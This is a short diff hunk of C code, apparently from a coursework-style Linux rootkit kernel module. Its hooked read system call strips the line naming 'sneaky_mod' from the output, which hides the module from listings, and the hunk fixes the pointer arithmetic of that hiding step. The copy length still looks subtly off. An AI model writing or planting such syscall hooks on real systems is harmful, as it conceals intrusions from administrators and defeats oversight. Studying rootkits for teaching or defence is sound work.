@@ -107,11 +107,9 @@ asmlinkage int sneaky_sys_read(struct pt_regs *regs)
   char * sneaky_mod_buf = strstr(original_buf, "sneaky_mod");
   
   if( sneaky_mod_buf != NULL){
-    int pos_begining = sneaky_mod_buf - original_buf;
     char * after_sneaky_mod_buf = strchr(sneaky_mod_buf, '\n');
-    int pos_end = after_sneaky_mod_buf - original_buf;
-    int line_size = pos_end - pos_begining;
-    memmove(pos_begining, pos_end, line_size);
+    int line_size = after_sneaky_mod_buf - sneaky_mod_buf;
+    memmove(sneaky_mod_buf, after_sneaky_mod_buf, line_size);
     sneaky_result -= line_size;
   }
   
